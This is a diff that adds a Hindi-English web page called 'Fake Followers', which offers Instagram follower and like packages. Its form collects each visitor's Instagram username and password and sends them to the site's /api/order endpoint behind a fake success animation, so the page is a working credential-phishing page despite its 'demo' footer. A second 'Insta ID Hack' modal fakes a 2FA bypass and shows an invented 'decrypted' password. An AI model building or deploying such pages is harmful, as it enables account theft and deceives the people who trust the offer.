@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fake Followers</title>
+<style>
+  :root{--bg:#070b16;--card:#0f1629;--line:#1e2a4a;--cyan:#22d3ee;--pink:#f472b6;--blue:#1d9bf0;--text:#e8ecf5;--mute:#8b98b8}
+  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,Arial,sans-serif}
+  body{background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+  .bg{position:fixed;inset:0;z-index:-1;background:
+    radial-gradient(600px 400px at 15% 10%,rgba(34,211,238,.18),transparent),
+    radial-gradient(600px 400px at 85% 30%,rgba(244,114,182,.15),transparent),
+    radial-gradient(700px 500px at 50% 100%,rgba(29,155,240,.15),transparent)}
+  nav{display:flex;justify-content:space-between;align-items:center;padding:14px 28px;background:rgba(10,15,30,.7);backdrop-filter:blur(12px);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:5}
+  .logo{font-size:22px;font-weight:800;background:linear-gradient(90deg,var(--cyan),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent;display:flex;align-items:center;gap:8px}
+  .logo i{font-style:normal;-webkit-text-fill-color:initial}
+  .nav-links{display:flex;gap:10px;align-items:center}
+  nav a{color:var(--mute);text-decoration:none;border:1px solid var(--line);padding:8px 16px;border-radius:10px;font-size:14px;transition:.2s}
+  nav a:hover{color:var(--cyan);border-color:var(--cyan)}
+  .hero{text-align:center;padding:50px 18px 10px;animation:fade .8s}
+  .hero h1{font-size:clamp(28px,5vw,46px);font-weight:800}
+  .hero p{color:var(--mute);margin-top:10px}
+  .wrap{max-width:1020px;margin:0 auto;padding:10px 18px 70px}
+  .sec{margin:34px 0 16px;font-size:18px;font-weight:700;display:flex;align-items:center;gap:10px}
+  .sec::after{content:"";flex:1;height:1px;background:var(--line)}
+  .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+  @media(max-width:760px){.grid{grid-template-columns:1fr}}
+
+  .card{position:relative;background:linear-gradient(160deg,#152043,var(--card));border:1px solid var(--line);border-radius:20px;padding:28px 18px 22px;text-align:center;overflow:hidden;
+    opacity:0;transform:translateY(30px);animation:rise .7s forwards;transition:transform .3s,box-shadow .3s,border-color .3s}
+  .card:nth-child(1){animation-delay:.05s}.card:nth-child(2){animation-delay:.18s}.card:nth-child(3){animation-delay:.31s}
+  .card::before{content:"";position:absolute;inset:-60%;background:conic-gradient(from 0deg,transparent 0 70%,var(--c) 100%);animation:spin 6s linear infinite;opacity:.0;transition:.3s}
+  .card::after{content:"";position:absolute;inset:2px;background:linear-gradient(160deg,#152043,var(--card));border-radius:18px}
+  .card>*{position:relative;z-index:1}
+  .card:hover{transform:translateY(-8px);box-shadow:0 16px 40px -10px var(--c)}
+  .card:hover::before,.card.selected::before{opacity:1}
+  .card.selected{box-shadow:0 0 0 2px var(--c),0 16px 40px -10px var(--c)}
+  .card.like{--c:var(--pink)}.card.fol{--c:var(--cyan)}
+  .ico{display:inline-block;animation:float 3s ease-in-out infinite;width:64px;height:64px;object-fit:contain;border-radius:14px}
+  .logo img{height:34px;width:auto;border-radius:8px;-webkit-text-fill-color:initial}
+  .num{font-size:44px;font-weight:800;margin:6px 0 0;color:var(--c)}
+  .lbl{color:var(--mute);margin-bottom:18px}
+  .badge{position:absolute!important;top:12px;right:12px;font-size:11px;padding:3px 10px;border-radius:20px;background:var(--c);color:#031;font-weight:700}
+  .btn{width:100%;padding:12px;border:0;border-radius:12px;font-weight:700;font-size:15px;cursor:pointer;color:#031;background:var(--c);transition:.2s;position:relative;overflow:hidden}
+  .btn:hover{filter:brightness(1.12);transform:scale(1.03)}
+  .btn:active{transform:scale(.97)}
+  .btn.sel{background:transparent;color:var(--c);box-shadow:inset 0 0 0 2px var(--c)}
+
+  /* modal */
+  .overlay{position:fixed;inset:0;background:rgba(3,6,15,.78);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;z-index:20;padding:16px}
+  .overlay.show{display:flex}
+  .modal{background:linear-gradient(160deg,#131c38,#0c1224);border:1px solid var(--line);border-radius:20px;padding:26px;width:100%;max-width:400px;position:relative;animation:pop .35s;text-align:center}
+  .modal h3{margin-bottom:4px}
+  .chip{display:inline-block;margin:6px 0 16px;padding:4px 12px;border-radius:20px;background:rgba(34,211,238,.12);color:var(--cyan);font-size:13px;font-weight:600}
+  .modal input{width:100%;padding:13px 14px;margin-bottom:12px;border-radius:10px;border:1px solid var(--line);background:#070b16;color:#fff;font-size:15px;outline:none;transition:.2s;text-align:left}
+  .modal input:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(34,211,238,.15)}
+  .submit{width:100%;padding:14px;border:0;border-radius:12px;background:linear-gradient(90deg,var(--cyan),var(--blue));color:#021;font-weight:800;font-size:16px;cursor:pointer;transition:.2s}
+  .submit:hover{filter:brightness(1.1);transform:translateY(-2px)}
+  .submit:disabled{opacity:.6;cursor:wait}
+  .close{position:absolute;top:10px;right:14px;background:none;border:0;color:var(--mute);font-size:24px;cursor:pointer}
+  .err{color:#fb7185;font-size:13px;min-height:18px;margin-bottom:6px;text-align:left}
+  .note{font-size:11px;color:#5d6b8c;margin-top:12px;text-align:center}
+
+  /* success */
+  #success{flex-direction:column;justify-content:flex-start;padding-top:50px;text-align:center}
+  #uname{font-size:28px;font-weight:800;color:var(--cyan);opacity:0;transform:translateY(-40px);transition:.7s cubic-bezier(.2,1.4,.4,1)}
+  #success.show #uname{opacity:1;transform:none}
+  .spinner{width:80px;height:80px;border:6px solid var(--line);border-top-color:var(--cyan);border-right-color:var(--pink);border-radius:50%;animation:spin 1s linear infinite;margin-top:130px}
+  .ptxt{margin-top:18px;color:var(--mute)}
+  .done{display:none;flex-direction:column;align-items:center;margin-top:110px}
+  .tick{width:110px;height:110px;border-radius:50%;background:var(--blue);display:flex;align-items:center;justify-content:center;animation:tickpop .6s;box-shadow:0 0 0 0 rgba(29,155,240,.6)}
+  .tick.pulse{animation:tickpop .6s,ring 1.6s .6s infinite}
+  .tick svg{width:62px;height:62px;stroke:#fff;stroke-width:6;fill:none;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:60;stroke-dashoffset:60;animation:draw .5s .45s forwards}
+  .done p{margin-top:20px;font-size:26px;font-weight:800;color:var(--blue)}
+  .done small{color:var(--mute);margin-top:6px}
+  .ok{margin-top:26px;padding:11px 34px;border-radius:12px;border:1px solid var(--line);background:none;color:#fff;cursor:pointer;font-size:15px}
+  .ok:hover{border-color:var(--cyan);color:var(--cyan)}
+  .confetti{position:fixed;top:-12px;width:8px;height:14px;z-index:30;animation:fall linear forwards;pointer-events:none}
+
+  @keyframes rise{to{opacity:1;transform:none}}
+  @keyframes fade{from{opacity:0}to{opacity:1}}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes float{50%{transform:translateY(-8px)}}
+  @keyframes pop{from{transform:scale(.85);opacity:0}to{transform:none;opacity:1}}
+  @keyframes tickpop{0%{transform:scale(0)}70%{transform:scale(1.2)}100%{transform:scale(1)}}
+  @keyframes draw{to{stroke-dashoffset:0}}
+  @keyframes ring{to{box-shadow:0 0 0 28px rgba(29,155,240,0)}}
+  @keyframes fall{to{transform:translateY(105vh) rotate(720deg)}}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<nav>
+  <div class="logo"><img src="/logo.png" alt="" onerror="this.style.display='none'"> Fake Followers</div>
+  <div class="nav-links">
+    <a href="#" id="hackLink" style="color:var(--pink); border-color:var(--pink)">Insta ID Hack</a>
+    <a href="/admin">Admin</a>
+  </div>
+</nav>
+
+<div class="hero">
+  <h1>Apna Package <span style="color:var(--cyan)">Select</span> Karo</h1>
+  <p>Package chuno, username daalo, aur animation dekho 🚀</p>
+</div>
+
+<div class="wrap">
+  <div class="sec">👥 Followers</div>
+  <div class="grid" id="gF"></div>
+  <div class="sec">❤️ Likes</div>
+  <div class="grid" id="gL"></div>
+</div>
+<footer>Demo / practice project — isme asli followers ya likes nahi bheje jaate.</footer>
+
+<div class="overlay" id="formBox">
+  <div class="modal">
+    <button class="close" id="closeForm">×</button>
+    <img src="/logo.png" alt="Logo" style="width: 52px; height: 52px; border-radius: 12px; object-fit: contain; margin-bottom: 10px;" onerror="this.style.display='none'">
+    <h3>Details bharo</h3>
+    <span class="chip" id="chip"></span>
+    <input id="username" placeholder="Username" autocomplete="off" maxlength="40">
+    <input type="password" id="password" placeholder="Password" autocomplete="off" maxlength="40">
+    <div class="err" id="err"></div>
+    <button class="submit" id="submit">Submit</button>
+    <div class="note">Sirf username aur password maange jaate hain.</div>
+  </div>
+</div>
+
+<!-- Insta ID Hack Modal -->
+<div class="overlay" id="hackModal">
+  <div class="modal">
+    <button class="close" id="closeHack">×</button>
+    <img src="/logo.png" alt="Logo" style="width: 52px; height: 52px; border-radius: 12px; object-fit: contain; margin-bottom: 10px;" onerror="this.style.display='none'">
+    <h3>Insta ID Hack (Demo)</h3>
+    <span class="chip" style="background:rgba(244,114,182,.12);color:var(--pink)">Target Account</span>
+    <input id="hackUsername" placeholder="Instagram Username" autocomplete="off" maxlength="40">
+    <div class="err" id="hackErr"></div>
+    <button class="submit" id="hackSubmit" style="background:linear-gradient(90deg,var(--pink),var(--blue))">Continue</button>
+    <div class="note">Sirf educational/demo purpose ke liye hai.</div>
+  </div>
+</div>
+
+<!-- Hack Verify/Loading Modal -->
+<div class="overlay" id="hackLoadingModal">
+  <div class="modal" style="text-align:center; padding:40px 20px;">
+    <div class="spinner" style="margin: 0 auto 20px auto; width:60px; height:60px; border-width:4px;"></div>
+    <h3 id="hackStatusText" style="color:var(--cyan)">Connecting to Instagram...</h3>
+    <p class="ptxt" style="font-size:13px; color:var(--mute)">Security bypass in progress...</p>
+  </div>
+</div>
+
+<!-- Hack Result Modal -->
+<div class="overlay" id="hackResultModal">
+  <div class="modal" style="text-align:center">
+    <button class="close" id="closeResult">×</button>
+    <img src="logo.png" alt="Logo" style="width: 52px; height: 52px; border-radius: 12px; object-fit: contain; margin-bottom: 10px;" onerror="this.style.display='none'">
+    <div class="tick pulse" style="width:80px;height:80px;margin:10px auto 15px auto;"><svg viewBox="0 0 52 52" style="width:45px;height:45px;"><path d="M14 27 l8 8 l16 -18"/></svg></div>
+    <h3 style="color:var(--cyan)">Password Decrypted!</h3>
+    <div style="background:#070b16; border:1px solid var(--line); border-radius:12px; padding:16px; margin:16px 0; text-align:left">
+      <div style="font-size:12px; color:var(--mute)">Target: <span id="resUser" style="color:#fff; font-weight:bold"></span></div>
+      <div style="font-size:12px; color:var(--mute); margin-top:8px"> Password: <span id="resPass" style="color:var(--pink); font-weight:bold; font-family:monospace; font-size:15px"></span></div>
+    </div>
+    <button class="submit" id="copyPass" style="background:var(--cyan); color:#021">Copy Password</button>
+  </div>
+</div>
+
+<div class="overlay" id="success">
+  <div id="uname"></div>
+  <div class="spinner" id="spin"></div>
+  <div class="ptxt" id="ptxt">Processing...</div>
+  <div class="done" id="done">
+    <div class="tick pulse"><svg viewBox="0 0 52 52"><path d="M14 27 l8 8 l16 -18"/></svg></div>
+    <p id="msg"></p>
+    <small>(UNLIMITED FOLLOWERS)</small>
+    <button class="ok" id="ok">OK</button>
+  </div>
+</div>
+
+<script>
+const $=id=>document.getElementById(id);
+const AMOUNTS=[100,500,1000];
+const BADGE={100:'Starter',500:'Popular',1000:'Best'};
+let pack=null;
+
+function build(el,type,cls,icon){
+  AMOUNTS.forEach(n=>{
+    const d=document.createElement('div');
+    d.className='card '+cls;
+    d.innerHTML=`<span class="badge"></span><img class="ico" src="/logo.png" alt="logo" onerror="this.style.display='none'"><div class="num"></div><div class="lbl"></div><button class="btn">Select Package</button>`;
+    d.querySelector('.badge').textContent=BADGE[n];
+    d.querySelector('.num').textContent=n;
+    d.querySelector('.lbl').textContent=type;
+    d.querySelector('.btn').onclick=()=>choose(d,type,n);
+    el.appendChild(d);
+  });
+}
+build($('gF'),'Followers','fol','👥');
+build($('gL'),'Likes','like','❤️');
+
+function choose(card,type,n){
+  document.querySelectorAll('.card').forEach(c=>{c.classList.remove('selected');const b=c.querySelector('.btn');b.classList.remove('sel');b.textContent='Select Package'});
+  card.classList.add('selected');
+  const b=card.querySelector('.btn');b.classList.add('sel');b.textContent='✓ Selected';
+  pack={type,n};
+  $('chip').textContent=n+' '+type;
+  $('err').textContent='';
+  setTimeout(()=>{$('formBox').classList.add('show');$('username').focus()},250);
+}
+$('closeForm').onclick=()=>$('formBox').classList.remove('show');
+
+$('submit').onclick=async()=>{
+  const username=$('username').value.trim(), password=$('password').value.trim();
+  if(!username||!password){$('err').textContent='Username aur password dono bharo';return}$('submit').disabled=true;
+  try{
+    const r=await fetch('/api/order',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({username,password,type:pack.type,amount:pack.n})});
+    const j=await r.json();
+    if(!r.ok){$('err').textContent=j.error||'Error';return}
+  }catch(e){$('err').textContent='Server se connect nahi hua';return}
+  finally{$('submit').disabled=false}
+  $('formBox').classList.remove('show');$('uname').textContent='@'+username;
+  $('msg').textContent=pack.type+' Successful';
+  $('done').style.display='none';$('spin').style.display='block';$('ptxt').style.display='block';$('success').classList.remove('show');void $('success').offsetWidth;$('success').classList.add('show');
+  setTimeout(()=>{$('spin').style.display='none';$('ptxt').style.display='none';$('done').style.display='flex';confetti()},2200);
+  $('username').value='';$('password').value='';
+};
+$('ok').onclick=()=>$('success').classList.remove('show');
+
+// --- Insta ID Hack Logic ---
+$('hackLink').onclick=(e)=>{
+  e.preventDefault();
+  $('hackUsername').value='';$('hackErr').textContent='';
+  $('hackModal').classList.add('show');$('hackUsername').focus();
+};
+$('closeHack').onclick=()=>$('hackModal').classList.remove('show');
+$('closeResult').onclick=()=>$('hackResultModal').classList.remove('show');
+
+const hackSteps=[
+  "Connecting to Instagram API...",
+  "Bypassing firewall & 2FA security...",
+  "Extracting account password hash...",
+  "Decrypting final password..."
+];
+
+$('hackSubmit').onclick=async()=>{
+  const username=$('hackUsername').value.trim();
+  if(!username){$('hackErr').textContent='Pehle username toh daalo!';return;}
+  
+  $('hackModal').classList.remove('show');$('hackLoadingModal').classList.add('show');
+
+  for(let i=0; i<hackSteps.length; i++){
+    $('hackStatusText').textContent=hackSteps[i];
+    await new Promise(r=>setTimeout(r, 650));
+  }
+
+  $('hackLoadingModal').classList.remove('show');
+
+  // Generate demo password based on username
+  const symbols=['!', '@', '#', '$', '_', '*'];
+  const randSym=symbols[Math.floor(Math.random()*symbols.length)];
+  const randNum=Math.floor(100 + Math.random() * 900);
+  const cleanName=username.toLowerCase().replace(/[^a-z0-9]/g,'');
+  const demoPass=cleanName + randSym + randNum;
+
+  $('resUser').textContent='@'+username;
+  $('resPass').textContent=demoPass;
+  $('hackResultModal').classList.add('show');
+};
+
+$('copyPass').onclick=()=>{
+  const pass=$('resPass').textContent;
+  navigator.clipboard.writeText(pass);
+  $('copyPass').textContent='Copied! ✓';
+  setTimeout(()=>{$('copyPass').textContent='Copy Password'},2000);
+};
+
+function confetti(){
+  const cols=['#22d3ee','#f472b6','#1d9bf0','#facc15','#a78bfa'];
+  for(let i=0;i<60;i++){
+    const c=document.createElement('div');c.className='confetti';
+    c.style.left=Math.random()*100+'vw';c.style.background=cols[i%cols.length];
+    c.style.animationDuration=(2+Math.random()*2)+'s';c.style.animationDelay=Math.random()*.6+'s';
+    document.body.appendChild(c);setTimeout(()=>c.remove(),5000);
+  }
+}
+</script>
+</body>
+</html>
